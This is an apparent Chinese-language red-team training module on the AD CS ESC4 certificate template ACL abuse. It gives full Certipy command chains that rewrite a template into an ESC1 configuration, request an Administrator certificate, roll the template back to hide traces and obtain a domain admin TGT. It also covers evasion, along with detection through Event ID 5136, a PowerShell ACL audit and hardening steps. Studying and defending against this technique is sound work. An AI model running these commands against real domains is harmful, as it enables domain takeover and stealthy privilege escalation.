# R17.4 憑證範本發行原則與 ACL 覆寫濫用分析 (Certificate Template Policy Modification / ESC4)

---

## 🎯 作戰任務破題 (Tactical Objective & Mental Workflow)

**憑證範本存取控制 (ACL) 覆寫濫用 (AD CS ESC4)** 發生於低權限網域使用者或遭竊憑證對某個憑證範本物件擁有「寫入特權」時。其本質為：**「Active Directory 憑證範本是以 LDAP 物件形式儲存於 `CN=Configuration` 命名空間；當攻擊者對範本擁有寫入控制權（如 `GenericAll`、`GenericWrite`、`WriteOwner` 或 `WriteDacl`）時，即便該範本當前完全安全，攻擊者可先備份現狀，動態將其屬性竄改為易受攻擊的 ESC1 配置（允許自訂 SAN 與 Client Auth），申請管理員憑證後，再立即將範本還原至原始狀態，達成極高隱蔽性的暫態提權」**。

```
[低權限用戶 (具備範本 Write 權限)] ── 1. 備份目標範本原始屬性
       │
       ├── 2. LDAP 修改屬性：將範本動態改造為 ESC1 脆弱配置 (啟用自訂 SAN + Client Auth)
       ▼
[目標憑證範本 (如 UserCustom)] ➔ 狀態變更為易受攻擊！
       │
       ├── 3. 呼叫 certipy req 申請 Administrator 憑證 ──► [企業 CA 成功簽發 admin.pfx]
       ▼
[攻擊者控制台] ◄── 4. 取得 admin.pfx
       │
       ├── 5. 立即將範本屬性還原為備份狀態 (清理現場，消除脆弱標記)
       ▼
[發起 Kerberos PKINIT] ──► 換取 Domain Admin TGT 票據！
```

### 核心作戰決策與邊界
- **ESC4 核心前提**：調用者帳號在目標範本物件的存取控制清單 (ACL) 中具備以下任一危險特權：
  - `GenericAll` / `FullControl` (完全控制)
  - `GenericWrite` / `WriteProperty` (寫入屬性)
  - `WriteOwner` (取得擁有權後賦予寫入權)
  - `WriteDacl` (直接修改權限授予自身寫入權)
- **技術邊界**：
  - **與 ESC1 差異**：ESC1 是現成存在的配置失誤範本；ESC4 則是攻擊者**透過寫入特權「主動製造」一個暫態 ESC1 漏洞**，用畢立即擦除還原。

## 🔬 第一動：AD CS 範本物件 ACL 與屬性覆寫機制全景解剖 (Mechanics & Template Attributes)

### 1. 範本物件 LDAP 儲存路徑
```text
LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=internal
```

### 2. ESC4 動態改造必須覆寫的核心屬性矩陣

| 屬性名稱 (Attribute) | 改造為脆弱狀態之數值 | 語意與底層行為 |
| :--- | :--- | :--- |
| **`msPKI-Certificate-Name-Flag`** | `0x00010000` (`ENROLLEE_SUPPLIES_SUBJECT`) | 強制允許申請者在 CSR 中自訂 SAN (UPN) |
| **`pKIExtendedKeyUsage`** | 包含 `1.3.6.1.5.5.7.3.2` | 強制開啟用戶端身分驗證 (Client Authentication) |
| **`msPKI-Enrollment-Flag`** | 移除 `0x00000002` (`PEND_ALL_REQUESTS`) | 關閉管理員手動核准要求，強制立即簽發 |
| **`msPKI-RA-Signature`** | `0` | 移除任何註冊代理人授權簽章要求 |
| **`nTSecurityDescriptor`** | 授予調用者帳號 `Enroll` 權限 | 確保攻擊者自身具備呼叫註冊之權限 |

## ⚡ 第二動：弱點驗證與字典級攻擊向量 (Attack Vectors)

### 核心利用指令速查表 (Certipy)

#### 1. 枚舉具備寫入控制權之範本 (ESC4)
```bash
certipy find -u "operator@corp.internal" -p "P@ssword123" -dc-ip 10.0.0.1 -vulnerable
# 檢查輸出中標記 [!] Vulnerabilities: ESC4 的範本，並檢視具備 Write 權限的帳號
```

#### 2. 一鍵備份並動態覆寫範本 (將範本轉換為 ESC1)
```bash
certipy template -u "operator@corp.internal" -p "P@ssword123" -dc-ip 10.0.0.1 \
    -template "VulnerableACLTemplate" -save-old
# Certipy 自動保存原始設定，並將範本重構為 ESC1
```

#### 3. 申請偽造之 Administrator 憑證
```bash
certipy req -u "operator@corp.internal" -p "P@ssword123" -ca "CORP-CA" \
    -template "VulnerableACLTemplate" -upn "administrator@corp.internal" -dc-ip 10.0.0.1
# 輸出: administrator.pfx
```

#### 4. 立即還原範本至原始安全狀態 (消除痕跡)
```bash
certipy template -u "operator@corp.internal" -p "P@ssword123" -dc-ip 10.0.0.1 \
    -template "VulnerableACLTemplate" -configuration "VulnerableACLTemplate.json"
# 範本屬性與 ACL 完全復原
```

#### 5. PKINIT 換取 TGT
```bash
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
```

## 🥷 第三動：防禦規避與日誌鑑識特徵 (Evasion & Telemetry)

- **防禦規避策略**：
  - 攻擊者將範本竄改至還原的整個攻擊空窗期壓縮在數秒之內；若 SOC 僅以週期性腳本（如每日掃描一次）檢查範本，將完全察覺不到漏洞曾被動態植入。
- **鑑識與遙測特徵**：
  - **目錄物件修改日誌 (Event ID 5136)**：在 Domain Controller 的 Security Log 中，記錄到 `CN=Certificate Templates` 底下某個範本物件的 `msPKI-Certificate-Name-Flag` 與 `pKIExtendedKeyUsage` 屬性被修改，隨後在短時間內再次被改回。
  - **修改者主體非 Enterprise Admins**：發起修改的帳號為普通員工或非標準運維帳號。

## 🛡️ 第五動：安全加固與修復基線 (Hardening & Remediation Baseline)

### 1. PowerShell 稽核憑證範本危險 ACL 委派
```powershell
Import-Module ActiveDirectory
$ConfigNC = (Get-ADRootDSE).configurationNamingContext

# 檢查所有憑證範本中非管理員的危險寫入權限
Get-ChildItem "AD:\CN=Certificate Templates,$ConfigNC" | ForEach-Object {
    $Template = $_
    Get-Acl "AD:$($Template.DistinguishedName)" | Select-Object -ExpandProperty Access |
        Where-Object { 
            $_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteProperty|WriteDacl|WriteOwner" -and 
            $_.IdentityReference -notmatch "Enterprise Admins|Domain Admins|SYSTEM" 
        } | Select-Object @{N="Template";E={$Template.Name}}, IdentityReference, ActiveDirectoryRights
}
```

### 2. 撤銷危險寫入權限 (安全加固)
在憑證範本管理員中：
1. 開啟目標範本的 **Security (安全性)** 分頁；
2. 檢查所有非管理員群組；
3. **取消勾選 `Full Control`、`Write`、`Write Owner`、`Write Permissions`**；
4. 嚴格限定僅允許特定的管理團隊擁有管理權限。

## 🧪 實戰演練環境導引 (Hands-on Range Lab Walkthrough)

### 1. 靶場情境設定
- **網域**：`corp.internal`
- **攻擊者**：`user1` (對範本 `Custom-VPN` 具備 `GenericAll` 權限)
- **初始狀態**：`Custom-VPN` 是一個常規、不支援自訂 SAN 的普通安全範本

### 2. 三步驗證流程

1. **備份並覆寫範本**：
   ```bash
   certipy template -u "user1@corp.internal" -p "Password123" -dc-ip 10.0.0.1 \
       -template "Custom-VPN" -save-old
   # 回顯: Successfully updated 'Custom-VPN' (已轉為 ESC1)
   ```
2. **申請管理員憑證並立即還原範本**：
   ```bash
   # 申請憑證
   certipy req -u "user1@corp.internal" -p "Password123" -ca "CORP-CA" \
       -template "Custom-VPN" -upn "Administrator@corp.internal" -dc-ip 10.0.0.1
   # 還原範本
   certipy template -u "user1@corp.internal" -p "Password123" -dc-ip 10.0.0.1 \
       -template "Custom-VPN" -configuration "Custom-VPN.json"
   # 回顯: Successfully restored 'Custom-VPN'
   ```
3. **驗證換取 TGT**：
   ```bash
   certipy auth -pfx Administrator.pfx -dc-ip 10.0.0.1
   # 成功獲得 Administrator TGT 票據，攻擊閉環完成！
   ```

## 🎯 作戰驗收檢查點 (Mastery Checklist)

- [ ] **Q1. 什麼是 AD CS 中的 ESC4 弱點？與 ESC1 有何本質區別？**  
  *分析思路*：ESC1 是範本本身已經處於錯誤配置；ESC4 則是攻擊帳號對某個安全範本擁有 ACL 寫入控制特權（如 GenericAll），使攻擊者能主動將其動態竄改為 ESC1 進行利用，隨後擦除痕跡。

- [ ] **Q2. 攻擊者在利用 ESC4 時，為什麼「必須保存舊配置並進行復原 (Rollback)」？**  
  *分析思路*：若維持 ESC1 狀態，任何後續的安全掃描工具或管理員稽核都會立即發現該範本存在致命漏洞；即時還原能將脆弱時間窗口壓縮至數秒，最大化防禦規避效果。

- [ ] **Q3. 哪些 Active Directory 權限會導致憑證範本遭受 ESC4 攻擊？**  
  *分析思路*：`GenericAll` (完全控制)、`GenericWrite` (泛型寫入)、`WriteProperty` (寫入特定屬性)、`WriteDacl` (可修改權限清單)、`WriteOwner` (可搶佔物件擁有權)。

- [ ] **Q4. 藍隊要如何透過 Windows 事件日誌捕捉 ESC4 攻擊？**  
  *分析思路*：監控 Domain Controller 的 Event ID 5136（目錄物件屬性修改）；特別針對物件類別為 `pKICertificateTemplate` 的屬性異動進行高優先級告警。

- [ ] **Q5. 徹底防範 ESC4 的黃金加固原則為何？**  
  *分析思路*：嚴格稽核 `CN=Certificate Templates` 容器及其所有子範本的 ACL；落實最小特權原則，除預設的 Enterprise Admins 外，徹底拔除非特權帳號的所有寫入、修改權限與擁有權委派。
